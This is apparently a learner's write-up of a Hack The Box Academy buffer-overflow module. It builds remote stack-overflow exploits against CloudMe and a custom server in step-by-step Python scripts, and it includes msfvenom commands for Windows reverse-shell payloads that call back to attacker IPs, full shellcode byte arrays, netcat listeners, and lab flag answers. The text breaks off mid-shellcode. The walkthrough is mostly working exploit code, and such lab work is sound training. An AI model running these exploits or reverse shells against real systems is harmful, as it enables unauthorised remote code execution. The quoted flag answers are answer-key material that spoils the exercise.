Note: In our case, the program is closing the connection after each input, as we saw earlier, so we are establishing a new connection at each loop iteration. If we could persist the connection, like an ftp or email client, it would be better to establish the connection before the loop, and then loop the `s.send(buffer)` function.

Tip: As our server is vulnerable at the entry point after establishing the connection, we are directly sending our payload. It is also possible to interact with the server and pass data like login credentials or certain parameters to reach the vulnerable function, by using `send` and `recv`. You can read more about `socket` functions in the [Official Documentation](https://docs.python.org/3/library/socket.html).

We run our script and see the following:

```cmd-session
Fuzzing 0 bytes
Fuzzing 500 bytes
...SNIP...
Fuzzing 9000 bytes
Fuzzing 9500 bytes
```

We see that the entire script ran without crashing the listening services, as port `8888` was still listening throughout our fuzzing. However, if we check our `x32dbg` debugger, we see that the front-end `cloudme` program crashed, and its `EIP` was overwritten with our `A`'s buffer:

![Remote Fuzz](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_fuzz.jpg)

This indicates that the actual listening service may not be vulnerable since our input never crashes it. However, the front-end program must also be processing this input (e.g., for syncing files), and it is vulnerable to a buffer overflow, which we can exploit through the listening service. This is a unique case that shows that if an input is processed at multiple locations/programs, we must be sure to debug all of them, as only one of them may be vulnerable.

---

## Gradual Fuzzing

We face the issue here because our program never stops sending payloads since the listening service never crashes. So, how would we be able to know at which buffer length the program crashed?

We can gradually send our buffer by adding a `breakpoint()` after `s.send(buffer)`, such that when we can manually continue by hitting `c`, we can see whether our input crashed the program and overwrote `EIP`.

Tip: You can have both `x32dbg` and the python IDLE side-by-side, so that you can immediately notice when the program crashes.

So, we will add our breakpoint to our exploit, restart the program in `x32dbg`, and start gradually fuzzing the program:

```cmd-session
Fuzzing 0 bytes
> c:\users\htb-student\desktop\win32bof_exploit_remote.py(13)fuzz()
-> s.send(buffer)
(Pdb) c
Fuzzing 500 bytes
> c:\users\htb-student\desktop\win32bof_exploit_remote.py(12)fuzz()
-> breakpoint()
(Pdb) c
Fuzzing 1000 bytes
> c:\users\htb-student\desktop\win32bof_exploit_remote.py(13)fuzz()
-> s.send(buffer)
(Pdb) c
Fuzzing 1500 bytes
> c:\users\htb-student\desktop\win32bof_exploit_remote.py(12)fuzz()
-> breakpoint()
(Pdb) c
...
```

Once the program crashes and `EIP` gets overwritten, we know that the last amount of bytes we sent is what crashed the program and that the program is vulnerable to a buffer overflow.

In the next section, we'll continue with the remaining steps we previously followed to exploit buffer overflow vulnerability.

**Academy Question**

Q:  Try the gradual remote fuzzing exercise shown above. What is the payload size that crashes the program 'in bytes'?
**Hint: It's the last payload you sent before the program crashed**
> 1500

**Solution**

Connect to the machine using `openvpn` and  `rdp` after that make an exploit file with the following content
```python
import socket
from struct import pack
def fuzz():
    try:
        for i in range(0,10000,500):
            IP = "127.0.0.1"
            port = 8888
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            s.close()
            sleep = input("Press Enter To Contunue")
    except:
        print("Could not establish a connection")

fuzz()
```
and name him like `remote_exploit.py`. You can do this using Python IDLE in the machine. after that open `x32dbg` and attach `CloudMe` process to him after that open `PowerShell` and run the exploit with the following command syntax
```powershell
PS C:\User\htb-student> python ./Desktop/remote_exploit.py
```
set debugger and `powershell` side by side so you can see when `EIP` value is overwritten and launch the exploit in `powershell` and `Press Enter each iteration` and you will see which iteration cause the value of `EIP` overwritten.

![Remote_exploit_BufferBytes](https://user-images.githubusercontent.com/85181215/142865615-cab56cf2-2388-45f4-92d5-c2b74cb6223b.png)

**Page 9 / Building a Remote Exploit**

# Building a Remote Exploit

# Building a Remote Exploit

---

After fuzzing the listening port, the remaining buffer overflow identification and exploitation steps should be largely the same as local buffer overflow exploitation. The main steps we followed in previous sections were:

1.  Fuzzing Parameters
2.  Controlling EIP
3.  Identifying Bad Characters
4.  Finding a Return Instruction
5.  Jumping to Shellcode

With fuzzing complete, we'll go through the remaining steps in this section until we can successfully exploit the buffer overflow vulnerability.

---

## Controlling EIP

We'll start by creating a unique pattern `2000` bytes long, using `ERC --pattern c 2000` as we previously did: 

![Remote Pattern](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern.jpg)

Now we start writing our `eip_offset()` function. We'll add our `pattern` variable like with the pattern under `Ascii` in the `Pattern_Create_1.txt` file created on our desktop, like we did with our previous exploit. After that, to send our pattern, we can use the same code we used to fuzz the port:

Code: python

```python
def eip_offset():
    pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    ...SNIP...
                    "5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co", "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(pattern)
    s.close()

eip_offset()
```

Once our `eip_offset()` function is ready, we can restart our program in `x32dbg` and run our code, and our program should crash, and we should see `EIP` overwritten with our pattern as `316A4230`: 

![Pattern Crash](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern_crash.jpg)

Now we can use `ERC --pattern o 1jB0` to calculate the exact offset, which is found at `1052` bytes:

![Pattern Offset](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern_offset.jpg)

Now to ensure that we can control the exact value at `EIP`, we'll use the same `eip_control()` function from our previous exploit (while changing `offset`), but with using `socket` to send our payload instead of writing it to a file:

Code: python

```python
def eip_control():
    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

eip_control()
```

We'll once again restart our program and run our exploit, and we can confirm that we control `EIP` as we overwrote `EIP` with 4 `B`'s: 

![Pattern Control](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern_control.jpg)

---

## Identifying Bad Characters

Our next step is to identify whether we should avoid using any bad characters in our input. We can start by running `ERC --bytearray` in `x32dbg` to create our `ByteArray_1.bin` file. Then we can copy the same `bad_chars()` functions from our previous exploit, and once again change from writing the payload to a file to sending it to the port:

Code: python

```python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()
```

Once we restart our program in `x32dbg` and run our exploit, we can use `ERC --compare` to compare the bytes at the `ESP` address with the `ByteArray_1.bin` file: 

![Bytes Compare](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_bytes_compare.jpg)

As we can see, all of the bytes match between memory and `ByteArray_1.bin`, which means that this program does not have any bad characters.

---

## Finding a Return Instruction

Now that we have control over `EIP` and know which bad characters to avoid in our payload, we need to find an instruction to execute the payload we will place on the stack. Once again, since this program does not have any bad characters, we can use the `ESP` address as our return address. (Try to exploit the program by using `ESP` as the return address).

However, we will prefer using an address of an instruction built within the program to ensure it will run on any system, as these instructions will be the same on any system. So, we'll first get a list of modules and libraries loaded by the program, and we will only consider ones that have `False` for all protections, which are the following:

```cmd-session
------------------------------------------------------------------------------------------------------------------------ 
Process Name: CloudMe Modules total: 79 
------------------------------------------------------------------------------------------------------------------------ 
 Base          | Entry point   | Size      | Rebase   | SafeSEH  | ASLR    | NXCompat | OS DLL  | Version, Name and Path 
------------------------------------------------------------------------------------------------------------------------ 
 0x400000        0x14c0          0x431000    False      False      False      False      False      C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\CloudMe.exe 
 0x61b40000      0x1410          0x5f6000    False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll 
 0x69900000      0x1410          0x1c1000    False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll 
 0x6d9c0000      0x1410          0x4c000     False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll 
 0x66e00000      0x1410          0x3d000     False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Xml.dll 
 0x6eb40000      0x1410          0x24000     False      False      False      False      False      C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\libgcc_s_dw2-1.dll 
 0x6fe40000      0x1410          0x17e000    False      False      False      False      False      C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\libstdc++-6.dll 
 0x64b40000      0x1410          0x1b000     False      False      False      False      False      1,;WinPthreadGC;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\libwinpthread-1.dll 
 0x6aa80000      0x1410          0x1b7000    False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\platforms\qwindows.dll 
```

As we can see, there are several libraries loaded by the program with no memory protections, including the `CloudMe.exe` program itself. To search all of them for `JMP ESP`, we can go to the `CPU` tab and right-click then select `Search For>All Modules>Command`, and enter the `JMP ESP`, and we will get a list of `JMP ESP` instructions in loaded modules: 

![Find JMP](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_find_jmp_1.jpg)

If we had not found any results, we could search for the `FFE4` pattern in the entire module or all modules, as was shown in an earlier section. We can also look for other useful instructions, like `54C3`. In our case, after double-clicking on the first result to ensure it is indeed `JMP ESP`, we can copy the address `0069D2E5` and use it in our exploit. (Try to find other instructions and use them as the return address).

---

## Jumping to Shellcode

Our final step is to exploit the program, so we'll start by creating our shellcode with `msfvenom` to open `calc.exe` as proof of successful exploitation:

```shell-session
W4H33D@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'

...SNIP...
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
...SNIP...
```

Now to create our final `exploit()` function, we'll first add the above output, and will use the same `payload` from our previous exploit (while changing `offset` and address in `eip`). Finally, we will use the same code from `bad_chars()` to send our payload to the port:

Code: python

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
    buf = b""
    ...SNIP...
    buf += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

    offset = 1052
    buffer = b"A"*offset
    eip = pack('<L', 0x0069D2E5)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

exploit()
```

Finally, we can run `CloudMe` (not necessarily in `x32dbg`) and run our exploit, and we should see it crash, and a calculator should pop open.

**Page 10 / Remote Exploitation**

# Remote Exploitation

# Remote Exploitation

---

As we have built and tested our exploit, we can now try running it on a real remote server. We can use the same exploit on the real target, and we only need to change the `IP` and `port` in our script to aim it at the new target and change the shellcode we use within the script to something that will send us a reverse shell.

---

## Reverse Shell Shellcode

First, we need to find our machine's IP, which should be reachable by the remote server (in the same network subnet):

```shell-session
W4H33D@htb[/htb]$ ip -4 a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    ...SNIP...
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    ...SNIP...
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    ...SNIP...
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    inet 10.10.15.10/23 brd 10.10.15.255 scope global tun0
```

The IP we will use is `tun0`'s IP, as our VM is on the same `10.10.` subnet.

Note: You need to be connected to the VPN to be able to interact with the remote server, so download the VPN key in case you want to run the exploit from your own machine. The PwnBox instance is already connected to the VPN, so you should be able to connect to the remote server.

Next, we will generate the shellcode that will send us a reverse shell, which we can get with the `windows/shell_reverse_tcp` payload in `msfvenom`, as follows:

```shell-session
W4H33D@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'

...SNIP...
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
...SNIP...
```

We can modify our exploit by copying the output and using it in the `exploit()` function for the `buf` variable.

---

## Remote Exploitation

After that, we can start a `netcat` listener to receive the reverse shell, as follows:

```shell-session
W4H33D@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

Once we are listening, we can run our payload with `python win32bof_exploit_remote.py` and wait for the remote server to send us a reverse shell if our exploitation was successful.

```shell-session
W4H33D@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.15.10] from (UNKNOWN) [10.10.10.10] 64539
Microsoft Windows [Version 10.0.19042.928]
(c) Microsoft Corporation. All rights reserved.

C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe>whoami
whoami
htb-student
```

As we can see, without having local access to the remote server, we successfully exploited the remote service and received a reverse shell. This shows us that if we properly debug the program, we can build and test our exploit locally, then run it on any remote server with the vulnerable program listening for remote connections.

You can download the final exploit code from [this link](https://academy.hackthebox.com/storage/modules/89/scripts/win32bof_exploit_remote_py.txt). Don't forget to rename it from `.txt` to `.py`.

**Academy Question**

Q: The above server has 'CloudMe' listening on port 8889. Try to use the exploit you built to get a reverse shell and read the flag on the user's Desktop.
**Hint: Don't forget to replace the IP/PORT with the ones shown above the question**
> A: HTB{r3m073_buff3r_0v3rfl0w3r}

**Solution**

Connect to the machine using `PwnBox` or `OpenVPN` after that start the machine and get his IP address. This machine didn't have any RDP service running so we can only exploit him remotely so HTB gave us the final exploit we just have to edit it with our machine.
Exploit are following:
```python
#!/usr/bin/python3
import socket
from struct import pack

def exploit():
    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.14.239 LPORT=4444 -f 'python'
    buf =  b""
    buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
    buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
    buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\xef\x68"
    buf += b"\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
    buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
    buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
    buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
    buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
    buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
    buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
    buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
    buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
    buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
    
	offset = 1052
    buffer = b"A"*offset
    eip = pack('<L', 0x0069D2E5)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.129.43.23", 8889))
    s.send(payload)
    s.close()
exploit()
```
There You can see i use command `msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.14.239 LPORT=4444 -f 'python'` with my `tun0` IP address that give me after connecting to `OpenVPN` you have to replace this with your own `tun0` IP Address or `PwnBox` IP address. I use port `4444` you can use any port what ever you want after that your command is ready run it and you will get the output that have your payload copy all the payload and replace it in above exploit.
Now only one thing left you must have to change before executing the exploit. That is change the IP address and port in the above exploit with your target machine.
```
 s.connect(("10.129.43.23", 8889))
```
There you will see `10.129.43.23` is the IP of my Target Machine you have to change it with your target machine.

Now you are ready to exploit the Target but we didn't start the listener so we have to start is also to get the reverse shell back to us. We can do that with the following command
```Netcat
$ nc -lvnp 4444
```
There `4444` is the port we set when we create our payload in `msfvenom` command `LPORT=4444` this should be same other wise you get nothing.
Run the exploit and we got the connection.

![remote_exploit_connection](https://user-images.githubusercontent.com/85181215/142865746-4fd21a03-b077-4cbc-bce5-7771a6e7040e.png)



Now use `whoami` command to see which user account is compromised and go to his Desktop and there you will get the `flag.txt`. Use `type` command to see its content.
```cmd
C:\WINDOWS\system32>type C:\Users\remote\Desktop\flag.txt
```
This single command should solve you problem.

**Page 11 / Skills Assessment**

# Skills Assessment

You are working for a small software development company, and their latest development project is a small encrypted server they built to exchange information between their team. They task you with performing a security assessment of this software and provide you with a copy of it. You see that the program listens for remote connections on port `21449`, so you need to fuzz the program to see whether it is vulnerable to any type of buffer overflows.

Download the attached file in the question below, perform all of the steps you learned in this module to debug the program with `x32dbg` on the Windows VM you used in the previous sections and write a working remote exploit. Once you have the exploit working on the Windows VM, try running it remotely on the target server to get a reverse shell and read the flag on the Administrator's Desktop.

Note: You need to be connected to the VPN to be able to interact with the remote server, so download the VPN key in case you want to run the exploit from your own machine. The PwnBox instance is already connected to the VPN, so you should be able to connect to the remote server.

Tip: If you want to download the `assessment.zip` file to the Windows VM for debugging, right-click on the button below, and select 'Copy Link', then download it in PwnBox and copy it to the remote server.

**Academy Question**

Q: What is the flag found on the Administrator's Desktop folder you got after gaining remote code execution?
**Hint: Don't forget to remove all bad characters from your shellcode and from the return address.**
> A: 

**Solution**

#### Fuzzing Script
```python
import socket
import struct

def remote_buffer():
	ip = "10.129.43.22"
	port = 21449
	for number in range(0, 10000, 500):
		offset = number
		buffer = b"A"*offset
		s = socket.socket()
		s.connect((ip,port))
		s.send(buffer)
		sleep = input(f'Totel bytes send {number} Press Enter to Continue')
		s.close()
remote_buffer()
```
1. By fuzzing found total 500 bytes required to overwrite EIP.
Now its time to use pattern create script `/usr/bin/msf-pattern_create -l 500` to generate a pattern and send it to the server to find exact offset
##### Fuzzing Script with pattern 
```python
import socket
import struct

def remote_buffer():
	ip = "10.129.43.22"
	port = 21449
	offset = ""
	buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"
	s = socket.socket()
	s.connect((ip,port))
	s.send(buffer)
	s.close()
remote_buffer()
```

After running the above python script EIP value is changed in the debugger and by using `/usr/bin/msf-pattern_offset -q <EIP value>` found exact offset is at `469`

![Assessment_offsetNo](https://user-images.githubusercontent.com/85181215/142865804-2569f95c-4720-42e3-a3c9-0bd0c42b52d1.png)


Now we know the exact value of offset is at `469` bytes and after that `4` bytes is use to overwrite EIP we can confirm this using the following script
```python
import socket
import struct

def remote_buffer():
	ip = "10.129.43.22"
	port = 21449
	offset = 469
	EIP = b"B"*4
	buffer = b"A"*offset+EIP
	s = socket.socket()
	s.connect((ip,port))
	s.send(buffer)
	s.close()
remote_buffer()
```
After running the above script we see EIP is change with `42424242` That is `B` in hex.

![Assessment_EIPinControl](https://user-images.githubusercontent.com/85181215/142865850-3db3524d-5018-436d-951e-5a978e380591.png)

So we now fully control the EIP next step is to find bad characters to do this we use `ERC --bytearray` command in `x32dbg`. They will create two files in our desktop name `ByteArray_1.txt` and `ByteArray_1.bin`. The `ByteArray_1.txt` file contain all the bad characters that we use in our python exploit to send to the server and compare it with `ByteArray_1.bin` file so we know how and which bad characters exits in the program. Now we have to copy the content of Raw bad chars from `ByteArray_1.txt` and remove all his new line and send him to the server after the Buffer and EIP value. The example code look like this 
```python
import socket
import struct

def remote_buffer():
	ip = "10.129.43.22"
	port = 21449
	offset = 469
	all_bad_chars = "" 
	BadChars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12...<snip>...\xB8\xB9\xF9\xFA\xFB\xFC\xFD\xFE\xFF"
	EIP = b"B"*4+BadChars
	buffer = b"A"*offset+EIP
	s = socket.socket()
	s.connect((ip,port))
	s.send(buffer)
	s.close()
remote_buffer()
```
There you see we paste our Raw bad characters in a `BadChars` variable and before we  run the program we have to copy the `ESP` value because we use this address to compare our bad characters as this is the the point where our input starts. Now we use the following command to compare the Bad character using ERC in `x32dbg`.
```x32dbg
ERC --compare <ESP value here> <PATH of ByteArray.bin file>
```
Like this 
```
ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin
```

This will show us output like following

![Byte Compare 1](https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_compare.jpg)

We see After `00` all the output didn't match so that is our first bad character so we have to remove it from our payload to do this we have to generate new bad characters list using command `ERC --bytearray -bytes 0x00` this will again generate `ByteArray_1.txt` if you delete previous `ByteArray_1.txt` and `ByteArray_1.bin` file if not then your new file have other name you can check on your own. So now we have to repeat the process again and send the new bad character to the server copy the ESP value and compare it using `ERC --compare <ESP value here> <PATH of ByteArray.bin>`
and found new bad character again and every time you found new bad character add him into the variable `all_bad_chars` like following
```python
import socket
import struct

def remote_buffer():
	ip = "10.129.43.22"
	port = 21449
	offset = 469
	all_bad_chars = "0x00" 
	BadChars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12...<snip>...\xB8\xB9\xF9\xFA\xFB\xFC\xFD\xFE\xFF"
	EIP = b"B"*4+BadChars
	buffer = b"A"*offset+EIP
	s = socket.socket()
	s.connect((ip,port))
	s.send(buffer)
	s.close()
remote_buffer()
```
Now repeat the process again until both value become same. The final exploit that give me both value same are following.
```python
import socket
import struct

def remote_buffer():
	ip = "10.129.43.22"
	port = 21449
	offset = 469
	all_bad_chars = "0x00,0x0a,0x0d" 
	BadChars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF"
	EIP = b"B"*4+BadChars
	buffer = b"A"*offset+EIP
	s = socket.socket()
	s.connect((ip,port))
	s.send(buffer)
	s.close()

remote_buffer()
```
I found `0x00,0x0a,0x0d` are the bad characters and write it into variable name `all_bad_chars` you can see above. Now we know all bad characters so now we are good to go into next step finding a return address to do this we have so many method and each depends on the target. You read different methods above but here i use `jmp esp` method in which we search `jmp esp` instruction from all the libraries the program uses and use that `jmp esp` address to run our shell code. So Load the binary to `x32dbg` and go to `symbols` sections and see which libraries they use or you can also use ERC `ERC --ModuleInfo` to see all the modules and then select that from `symbols` tab of `x32gdb` after press `CTRL + b` and write `jmp esp` in search bar now you will see different `jmp esp` instruction with its address. If you could not find any `jmp esp` instruction address then you can check its libraries for this i found `jmp esp` from its library that we download from academy note that address in your exploit code.

---

Now we can make shell code using `msfvanom` we can use the following command
```msfvanom
$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.14.85 LPORT=4444 -f 'python' -b '\x00\x0a\x0d'
```
There 
- `-p` is use to specify payload `windows/shell_reverse_tcp`
- `LHOST` is our machine IP address
- `LPORT` is our machine Port Number where we want to get the shell
- `-f`  is use to specify payload format in our case we use python
- `-b` is to specify bad characters that excluded from payload

That's it now you got a reverse shell code copy it in your exploit and its looks like this:
```python
import socket
from struct import pack

# msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.14.85 LPORT=4444 -f 'python' -b '\x00\x0a\x0d'
def shell():
		buf =  b""
		buf += b"\xda\xd2\xba\x4e\x94\x7c\x53\xd9\x74\x24\xf4\x58\x29"
		buf += b"\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\x1e\x87\x9e"
		buf += b"\xa6\x62\x4f\xdc\x49\x9a\x90\x81\xc0\x7f\xa1\x81\xb7"
		buf += b"\xf4\x92\x31\xb3\x58\x1f\xb9\x91\x48\x94\xcf\x3d\x7f"
		buf += b"\x1d\x65\x18\x4e\x9e\xd6\x58\xd1\x1c\x25\x8d\x31\x1c"
		buf += b"\xe6\xc0\x30\x59\x1b\x28\x60\x32\x57\x9f\x94\x37\x2d"
		buf += b"\x1c\x1f\x0b\xa3\x24\xfc\xdc\xc2\x05\x53\x56\x9d\x85"
		buf += b"\x52\xbb\x95\x8f\x4c\xd8\x90\x46\xe7\x2a\x6e\x59\x21"
		buf += b"\x63\x8f\xf6\x0c\x4b\x62\x06\x49\x6c\x9d\x7d\xa3\x8e"
		buf += b"\x20\x86\x70\xec\xfe\x03\x62\x56\x74\xb3\x4e\x66\x59"
		buf += b"\x22\x05\x64\x16\x20\x41\x69\xa9\xe5\xfa\x95\x22\x08"
		buf += b"\x2c\x1c\x70\x2f\xe8\x44\x22\x4e\xa9\x20\x85\x6f\xa9"
		buf += b"\x8a\x7a\xca\xa2\x27\x6e\x67\xe9\x2f\x43\x4a\x11\xb0"
		buf += b"\xcb\xdd\x62\x82\x54\x76\xec\xae\x1d\x50\xeb\xd1\x37"
		buf += b"\x24\x63\x2c\xb8\x55\xaa\xeb\xec\x05\xc4\xda\x8c\xcd"
